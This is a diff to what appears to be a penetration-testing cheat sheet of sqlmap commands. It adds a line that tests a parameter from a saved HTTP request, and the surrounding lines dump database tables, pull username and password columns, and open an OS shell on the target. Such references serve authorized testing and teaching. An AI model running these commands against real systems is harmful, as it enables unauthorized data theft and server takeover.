@@ -37,8 +37,11 @@ sqlmap -u "url?id=1" --batch --tables -D <db>     # List tables in a database
 sqlmap -u "url?id=1" --batch --dump -T <table> -D <db>  # Dump table contents
 sqlmap -u "url?id=1" --batch --os-shell           # Gain OS shell if possible
 sqlmap -u "http://target.com/page.php?id=1" --dump -D users -T accounts -C username,password
+sqlmap -r request.txt -p user_id --dbs
+
 ```
 The -C flag in sqlmap is used to specify one or more specific columns to dump from a table, instead of dumping all columns.
+This tells sqlmap to parse a raw HTTP request from a file (-r) and test a specific parameter (-p) for SQL injection.
 
 ### Example Post-Exploitation Commands:
 
